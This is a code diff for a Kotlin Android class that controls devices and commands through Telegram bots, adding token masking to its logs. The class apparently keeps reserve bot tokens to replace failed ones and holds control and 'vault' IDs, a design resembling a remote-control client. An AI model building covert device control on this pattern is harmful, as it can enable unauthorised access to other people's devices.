@@ -23,6 +23,11 @@ import com.example.app.safeGet
 
 /**
  * فئة إدارة واجهة Telegram والتحكم بالأجهزة والأوامر عبر البوتات.
+ * 
+ * ملاحظات أمنية:
+ * - التوكنات تُستقبل من ConfigLoader وهي مفكوكة بالفعل، ولكن يتم التعامل معها بحذر.
+ * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
+ * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
  */
 class TelegramUi(
     context: Context,
@@ -48,11 +53,11 @@ class TelegramUi(
     private var heartbeatJob: Job? = null
 
     // ========== بيانات البوتات والأجهزة ==========
-    // ✅ استخدام التوكنات من config
+    // ✅ استخدام التوكنات من config (مفكوكة بالفعل)
     private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
     private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
 
-    // ✅ المعرفات وكلمة المرور من config
+    // ✅ المعرفات وكلمة المرور من config (غير سرية بشكل كبير)
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
     private val appPassword: String = config.secret ?: ""
@@ -202,6 +207,7 @@ class TelegramUi(
                     if (reserveTokensList.isNotEmpty()) {
                         val newToken = reserveTokensList.removeAt(0)
                         activeTokensList.add(newToken)
+                        // ✅ إخفاء التوكن في السجل (نطبع أول 8 أحرف فقط)
                         writeLog("Swapped bad token with reserve: ${newToken.take(8)}...")
                         scope.launch {
                             apiCall(
@@ -1103,6 +1109,7 @@ class TelegramUi(
     }
 
     fun getStatus(): Map<String, Any> {
+        // ✅ لا نعرض التوكنات نفسها، بل الأعداد فقط
         return mapOf(
             "running" to isRunning,
             "active_tokens" to activeTokensList.size,
@@ -1135,14 +1142,21 @@ class TelegramUi(
     fun getDat(): Long = config.vaultId
 
     // ============================================================
-    //  دوال مساعدة (التسجيل والكتابة)
+    //  دوال مساعدة (التسجيل والكتابة) - مع تعزيز الأمان
     // ============================================================
 
     private fun writeLog(message: String) {
-        Log.i(TAG, message)
+        // ✅ لا تطبع أي توكنات - نثق أن المتصل لا يمرر توكنات كاملة
+        // ولكن نضيف تحققاً إضافياً: إذا احتوى الرسالة على نمط توكن (طويل ويبدأ بأرقام)، نقوم بتقطيعه
+        val safeMessage = if (message.length > 50 && message.matches(Regex("^\\d+:.*"))) {
+            message.take(20) + "... (token hidden)"
+        } else {
+            message
+        }
+        Log.i(TAG, safeMessage)
         try {
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-            val logText = "[$timestamp] [INFO] $message\n"
+            val logText = "[$timestamp] [INFO] $safeMessage\n"
             logFile.appendText(logText, Charsets.UTF_8)
         } catch (_: Exception) {
             // تجاهل أخطاء التسجيل في الملف
